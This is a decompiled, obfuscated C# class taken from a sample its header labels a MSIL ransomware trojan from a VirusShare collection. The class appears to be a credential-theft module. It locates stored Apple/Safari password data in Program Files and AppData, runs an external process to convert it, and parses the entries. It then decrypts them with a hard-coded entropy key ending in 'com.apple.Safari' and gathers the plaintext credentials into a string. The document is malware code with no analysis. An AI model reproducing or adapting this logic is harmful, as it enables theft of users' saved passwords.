// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLS, Version=2.24.9.7, Culture=neutral, PublicKeyToken=null
// MVID: 5D6D71DE-8D40-4460-ABF9-23365541871A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eaa908bb12fef0827442be70b4421db585c6c2d8b0ee62f8245856740ea6a776.exe

using \u0003\u000E;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace \u0003\u000E
{
  internal sealed class \u001B\u000E
  {
    public static string \u0001;

    public class \u0095\u0004
    {
      private byte[] \u0001;

      public \u0095\u0004() => this.\u0001 = new byte[144]
      {
        (byte) 29,
        (byte) 172,
        (byte) 168,
        (byte) 248,
        (byte) 211,
        (byte) 184,
        (byte) 72,
        (byte) 62,
        (byte) 72,
        (byte) 125,
        (byte) 62,
        (byte) 10,
        (byte) 98,
        (byte) 7,
        (byte) 221,
        (byte) 38,
        (byte) 230,
        (byte) 103,
        (byte) 129,
        (byte) 3,
        (byte) 231,
        (byte) 178,
        (byte) 19,
        (byte) 165,
        (byte) 176,
        (byte) 121,
        (byte) 238,
        (byte) 79,
        (byte) 15,
        (byte) 65,
        (byte) 21,
        (byte) 237,
        (byte) 123,
        (byte) 20,
        (byte) 140,
        (byte) 229,
        (byte) 75,
        (byte) 70,
        (byte) 13,
        (byte) 193,
        (byte) 142,
        (byte) 254,
        (byte) 214,
        (byte) 231,
        (byte) 39,
        (byte) 117,
        (byte) 6,
        (byte) 139,
        (byte) 73,
        (byte) 0,
        (byte) 220,
        (byte) 15,
        (byte) 48,
        (byte) 160,
        (byte) 158,
        (byte) 253,
        (byte) 9,
        (byte) 133,
        (byte) 241,
        (byte) 200,
        (byte) 170,
        (byte) 117,
        (byte) 193,
        (byte) 8,
        (byte) 5,
        (byte) 121,
        (byte) 1,
        (byte) 226,
        (byte) 151,
        (byte) 216,
        (byte) 175,
        (byte) 128,
        (byte) 56,
        (byte) 96,
        (byte) 11,
        (byte) 113,
        (byte) 14,
        (byte) 104,
        (byte) 83,
        (byte) 119,
        (byte) 47,
        (byte) 15,
        (byte) 97,
        (byte) 246,
        (byte) 29,
        (byte) 142,
        (byte) 143,
        (byte) 92,
        (byte) 178,
        (byte) 61,
        (byte) 33,
        (byte) 116,
        (byte) 64,
        (byte) 75,
        (byte) 181,
        (byte) 6,
        (byte) 110,
        (byte) 171,
        (byte) 122,
        (byte) 189,
        (byte) 139,
        (byte) 169,
        (byte) 126,
        (byte) 50,
        (byte) 143,
        (byte) 110,
        (byte) 6,
        (byte) 36,
        (byte) 217,
        (byte) 41,
        (byte) 164,
        (byte) 165,
        (byte) 190,
        (byte) 38,
        (byte) 35,
        (byte) 253,
        (byte) 238,
        (byte) 241,
        (byte) 76,
        (byte) 15,
        (byte) 116,
        (byte) 94,
        (byte) 88,
        (byte) 251,
        (byte) 145,
        (byte) 116,
        (byte) 239,
        (byte) 145,
        (byte) 99,
        (byte) 111,
        (byte) 109,
        (byte) 46,
        (byte) 97,
        (byte) 112,
        (byte) 112,
        (byte) 108,
        (byte) 101,
        (byte) 46,
        (byte) 83,
        (byte) 97,
        (byte) 102,
        (byte) 97,
        (byte) 114,
        (byte) 105
      };

      private IntPtr \u008D\u0004([In] IntPtr obj0)
      {
        IntPtr num;
        return num;
      }

      private bool \u0006\u0003(
        [In] ref \u001B\u000E.\u0095\u0004.\u0096\u0004 obj0,
        [In] string obj1,
        [In] ref \u001B\u000E.\u0095\u0004.\u0096\u0004 obj2,
        [In] IntPtr obj3,
        [In] ref IntPtr obj4,
        [In] int obj5,
        [In] ref \u001B\u000E.\u0095\u0004.\u0096\u0004 obj6)
      {
        bool flag;
        return flag;
      }

      public \u001B\u000E.\u0095\u0004.\u0097\u0004[] \u008E\u0004()
      {
        \u001B\u000E.\u0095\u0004.\u0097\u0004[] objArray;
        try
        {
          string str1 = \u000F.\u001E(global::\u000E.\u001D(Environment.SpecialFolder.ProgramFiles), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5745), \u0008.\u0007(217)));
          if (true)
            goto label_6;
label_1:
          string str2 = \u000F.\u001E(global::\u000E.\u001D(Environment.SpecialFolder.ApplicationData), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5850), \u0008.\u0007(217)));
          if (true)
            goto label_7;
label_2:
          if (true)
            goto label_8;
label_3:
          string str3;
          string str4;
          string str5;
          if (!this.\u0092\u0004(str3, str4, ref str5))
          {
            if (true)
            {
              objArray = (\u001B\u000E.\u0095\u0004.\u0097\u0004[]) null;
              goto label_12;
            }
            else
              goto label_12;
          }
          else
          {
            \u001B\u000E.\u0095\u0004.\u0097\u0004[] array = this.\u008F\u0004(\u0097.\u007E\u008C\u0002((object) str5, \u0007.\u007E\u000E((object) str5) - 2)).ToArray();
            if (true)
            {
              objArray = array;
              goto label_12;
            }
            else
              goto label_12;
          }
label_8:
          str5 = (string) null;
          goto label_3;
label_7:
          str4 = str2;
          goto label_2;
label_6:
          str3 = str1;
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_12:
        return objArray;
      }

      private List<\u001B\u000E.\u0095\u0004.\u0097\u0004> \u008F\u0004([In] string obj0)
      {
        string str = File.ReadAllText(obj0);
        if (true)
          goto label_13;
label_1:
        List<\u001B\u000E.\u0095\u0004.\u0097\u0004> objList1 = new List<\u001B\u000E.\u0095\u0004.\u0097\u0004>();
        if (true)
          goto label_14;
label_2:
        string input;
        List<\u001B\u000E.\u0095\u0004.\u0097\u0004> objList2;
        try
        {
          string[] strArray;
          int num1 = this.\u0094\u0004<string[]>(ref strArray, Regex.Split(Regex.Split(input, \u0007\u000E.\u0006\u000E(\u0008.\u0007(5931), \u0008.\u0007(217)))[1], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5948), \u0008.\u0007(217)))).Length - 1;
          if (true)
            goto label_7;
label_3:
          if (true)
            goto label_8;
label_6:
          int index;
          int num2;
          while (index <= num2)
          {
            \u001B\u000E.\u0095\u0004.\u0097\u0004 obj1 = new \u001B\u000E.\u0095\u0004.\u0097\u0004()
            {
              \u0001 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 0),
              \u000F = int.Parse(this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(6007), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6032), \u0008.\u0007(217)), 0)),
              \u0007 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 1),
              \u0002 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(6057), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6074), \u0008.\u0007(217)), 0),
              \u0004 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 2),
              \u0005 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 3),
              \u0006 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 4),
              \u0010 = int.Parse(this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(6007), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6032), \u0008.\u0007(217)), 1)),
              \u000E = int.Parse(this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(6007), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6032), \u0008.\u0007(217)), 2)),
              \u0008 = this.\u0093\u0004(strArray[index], \u0007\u000E.\u0006\u000E(\u0008.\u0007(5965), \u0008.\u0007(217)), \u0007\u000E.\u0006\u000E(\u0008.\u0007(5982), \u0008.\u0007(217)), 5),
              \u0011 = index - 1
            };
            obj1.\u0003 = this.\u0091\u0004(Convert.FromBase64String(obj1.\u0002));
            List<\u001B\u000E.\u0095\u0004.\u0097\u0004> objList3 = objList2;
            \u001B\u000E.\u0095\u0004.\u0097\u0004 obj2 = obj1;
            if (true)
              goto label_9;
label_5:
            int num3 = index + 1;
            if (true)
            {
              index = num3;
              continue;
            }
            continue;
label_9:
            objList3.Add(obj2);
            goto label_5;
          }
          goto label_12;
label_8:
          index = 1;
          goto label_6;
label_7:
          num2 = num1;
          goto label_3;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_12:
        return objList2;
label_14:
        objList2 = objList1;
        goto label_2;
label_13:
        input = str;
        goto label_1;
      }

      public void \u0090\u0004()
      {
        try
        {
          \u001B\u000E.\u0095\u0004.\u0097\u0004[] objArray1 = this.\u008E\u0004();
          if (true)
            goto label_11;
label_1:
          \u001B\u000E.\u0001 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(6091), \u0008.\u0007(217));
          \u001B\u000E.\u0095\u0004.\u0097\u0004[] objArray2;
          \u001B\u000E.\u0095\u0004.\u0097\u0004[] objArray3 = objArray2;
          if (true)
            goto label_12;
label_2:
          if (true)
            goto label_13;
label_8:
          \u001B\u000E.\u0095\u0004.\u0097\u0004[] objArray4;
          int index;
          while (true)
          {
            int num1;
            do
            {
              int num2 = index;
              int num3 = objArray4.Length;
              if (true)
                goto label_9;
label_7:
              num1 = num2 + num3;
              continue;
label_9:
              if (num2 < num3)
              {
                \u001B\u000E.\u0095\u0004.\u0097\u0004 obj1 = objArray4[index];
                if (true)
                  goto label_14;
label_5:
                \u001B\u000E.\u0095\u0004.\u0097\u0004 obj2;
                \u001B\u000E.\u0001 = \u0014\u0002.\u0008\u0003(\u001B\u000E.\u0001, \u0008.\u0007(848), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6229), \u0008.\u0007(217)), obj2.\u0001);
                string[] strArray1 = new string[5];
                if (true)
                  goto label_15;
label_6:
                string[] strArray2;
                strArray2[0] = \u001B\u000E.\u0001;
                strArray2[1] = \u0008.\u0007(848);
                strArray2[2] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(6254), \u0008.\u0007(217));
                strArray2[3] = obj2.\u0003;
                strArray2[4] = \u0008.\u0007(848);
                \u001B\u000E.\u0001 = \u0012.\u0080(strArray2);
                int num4 = index;
                num3 = 1;
                num2 = num4;
                goto label_7;
label_15:
                strArray2 = strArray1;
                goto label_6;
label_14:
                obj2 = obj1;
                goto label_5;
              }
              else
                goto label_10;
            }
            while (false);
            index = num1;
          }
label_10:
          \u001B\u000E.\u0001 = \u0010.\u001F(\u001B\u000E.\u0001, \u0008.\u0007(848), \u0007\u000E.\u0006\u000E(\u0008.\u0007(6279), \u0008.\u0007(217)));
          return;
label_13:
          index = 0;
          goto label_8;
label_12:
          objArray4 = objArray3;
          goto label_2;
label_11:
          objArray2 = objArray1;
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (false)
            return;
          \u0014.\u0082();
        }
      }

      private string \u0091\u0004([In] byte[] obj0)
      {
        string str;
        try
        {
          if (true)
            goto label_13;
label_1:
          IntPtr num1 = \u009C.\u0092\u0002(obj0.Length + 4);
          if (true)
            goto label_14;
label_2:
          \u000F\u0002 obj1 = \u000F\u0002.\u0002\u0003;
          byte[] numArray1 = obj0;
          IntPtr num2;
          IntPtr num3 = num2;
          int length1 = obj0.Length;
          if (true)
            goto label_15;
label_3:
          IntPtr num4 = \u009C.\u0092\u0002(this.\u0001.Length);
          if (true)
            goto label_16;
label_4:
          \u000F\u0002 obj2 = \u000F\u0002.\u0002\u0003;
          byte[] numArray2 = this.\u0001;
          IntPtr num5;
          IntPtr num6 = num5;
          int length2 = this.\u0001.Length;
          if (true)
            goto label_17;
label_5:
          \u001B\u000E.\u0095\u0004.\u0096\u0004 obj3;
          obj3.\u0001 = obj0.Length;
          obj3.\u0002 = num2;
          \u001B\u000E.\u0095\u0004.\u0096\u0004 obj4;
          obj4.\u0001 = this.\u0001.Length;
          obj4.\u0002 = num5;
          ref \u001B\u000E.\u0095\u0004.\u0096\u0004 local1 = ref obj3;
          ref \u001B\u000E.\u0095\u0004.\u0096\u0004 local2 = ref obj4;
          IntPtr zero1 = IntPtr.Zero;
          IntPtr zero2 = IntPtr.Zero;
          if (true)
            goto label_18;
label_6:
          IntPtr num7;
          ref IntPtr local3 = ref num7;
          \u001B\u000E.\u0095\u0004.\u0096\u0004 obj5;
          ref \u001B\u000E.\u0095\u0004.\u0096\u0004 local4 = ref obj5;
          if (!this.\u0006\u0003(ref local1, (string) null, ref local2, zero1, ref local3, 0, ref local4))
          {
            str = (string) null;
            goto label_20;
          }
          else
          {
label_8:
            \u0003\u0002.\u0099\u0002(num2);
            \u0003\u0002.\u0099\u0002(num5);
            int num8 = \u001F\u0002.\u001D\u0003(obj5.\u0002);
            byte[] numArray3 = new byte[num8 + 1];
            obj5.\u0002 = new IntPtr(obj5.\u0002.ToInt32() + 4);
            \u0089.\u0019\u0002(obj5.\u0002, numArray3, 0, num8);
            this.\u008D\u0004(obj5.\u0002);
            char[] chArray = new char[num8 - 1 + 1];
            int num9 = num8 - 1;
            int index = 0;
            while (true)
            {
              if (true)
              {
                if (index <= num9)
                {
                  chArray[index] = \u0019\u0002.\u0016\u0003((int) numArray3[index]);
                  ++index;
                }
                else
                  break;
              }
              else
                goto label_8;
            }
            str = new string(chArray);
            goto label_20;
          }
label_18:
          num7 = zero2;
          goto label_6;
label_17:
          obj2(numArray2, 0, num6, length2);
          goto label_5;
label_16:
          num5 = num4;
          goto label_4;
label_15:
          obj1(numArray1, 0, num3, length1);
          goto label_3;
label_14:
          num2 = num1;
          goto label_2;
label_13:
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_20:
        return str;
      }

      private bool \u0092\u0004([In] string obj0, [In] string obj1, [In] ref string obj2)
      {
        bool flag;
        try
        {
          obj2 = (string) null;
          int num1 = \u0084.\u0013\u0002(obj0) ? 1 : 0;
          Process process1;
          if (true)
          {
            if (num1 != 0)
            {
              if (true)
              {
                Process process2 = new Process();
                if (true)
                {
                  process1 = process2;
                  goto label_7;
                }
                else
                  goto label_7;
              }
              else
                goto label_13;
            }
          }
          else
            goto label_3;
label_2:
          num1 = 0;
label_3:
          if (true)
            goto label_14;
label_4:
          if (false)
            goto label_7;
          else
            goto label_21;
label_14:
          flag = num1 != 0;
          goto label_4;
label_7:
          \u009A\u0002 obj3 = \u009A\u0002.\u007E\u0004\u0004;
          ProcessStartInfo processStartInfo1 = \u0099\u0002.\u007E\u0003\u0004((object) process1);
          string str1 = obj0;
          if (true)
            goto label_16;
label_8:
          if (true)
          {
            \u009A\u0002 obj4 = \u009A\u0002.\u007E\u0005\u0004;
            ProcessStartInfo processStartInfo2 = \u0099\u0002.\u007E\u0003\u0004((object) process1);
            string[] strArray1 = new string[5];
            if (true)
              goto label_17;
label_10:
            string[] strArray2;
            strArray2[0] = \u0008.\u0007(6417);
            strArray2[1] = this.\u0094\u0004<string>(ref obj2, \u000F.\u001E(\u001A.\u008E(\u0008.\u007E\u0017((object) \u009B\u0002.\u0011\u0004())), \u0008.\u0007(6450)));
            strArray2[2] = \u0008.\u0007(6479);
            strArray2[3] = obj1;
            strArray2[4] = \u0008.\u0007(6479);
            string str2 = \u0012.\u0080(strArray2);
            if (true)
              goto label_18;
label_11:
            \u009C\u0002 obj5 = \u009C\u0002.\u007E\u0012\u0004;
            ProcessStartInfo processStartInfo3 = \u0099\u0002.\u007E\u0003\u0004((object) process1);
            if (true)
              goto label_19;
label_12:
            \u009C\u0002.\u007E\u0013\u0004((object) \u0099\u0002.\u007E\u0003\u0004((object) process1), true);
            \u009C\u0002.\u007E\u0014\u0004((object) \u0099\u0002.\u007E\u0003\u0004((object) process1), false);
            int num2 = \u0080\u0002.\u007E\u007F\u0003((object) process1) ? 1 : 0;
            \u0083.\u007E\u0004\u0002((object) process1);
            goto label_13;
label_19:
            obj5((object) processStartInfo3, true);
            goto label_12;
label_18:
            obj4((object) processStartInfo2, str2);
            goto label_11;
label_17:
            strArray2 = strArray1;
            goto label_10;
          }
          else
            goto label_2;
label_16:
          obj3((object) processStartInfo1, str1);
          goto label_8;
label_13:
          flag = \u0007.\u007E\u000E((object) \u0008.\u007E\u0011((object) \u009D\u0002.\u007E\u001C\u0004((object) process1))) == 0;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_21:
        return flag;
      }

      private string \u0093\u0004([In] string obj0, [In] string obj1, [In] string obj2, [In] int obj3)
      {
        string str1;
        try
        {
          string str2 = \u009E\u0002.\u001D\u0004(obj0, obj1)[obj3 + 1];
          if (true)
            goto label_2;
label_1:
          string str3;
          string str4 = \u009E\u0002.\u001D\u0004(str3, obj2)[0];
          if (true)
          {
            str1 = str4;
            goto label_5;
          }
          else
            goto label_5;
label_2:
          str3 = str2;
          goto label_1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0014.\u0082();
        }
label_5:
        return str1;
      }

      private \u0019\u0002 \u0094\u0004<\u0019\u0002>([In] ref \u0019\u0002 obj0, [In] \u0019\u0002 obj1)
      {
        \u0019\u0002 obj2;
        try
        {
          do
          {
            obj0 = obj1;
            \u0019\u0002 obj3 = obj1;
            if (true)
              goto label_2;
label_1:
            continue;
label_2:
            obj2 = obj3;
            goto label_1;
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return obj2;
      }

      private struct \u0096\u0004
      {
        public int \u0001;
        public IntPtr \u0002;
      }

      public struct \u0097\u0004
      {
        public string \u0001;
        public string \u0002;
        public string \u0003;
        public string \u0004;
        public string \u0005;
        public string \u0006;
        public string \u0007;
        public string \u0008;
        public int \u000E;
        public int \u000F;
        public int \u0010;
        public int \u0011;
      }
    }
  }
}
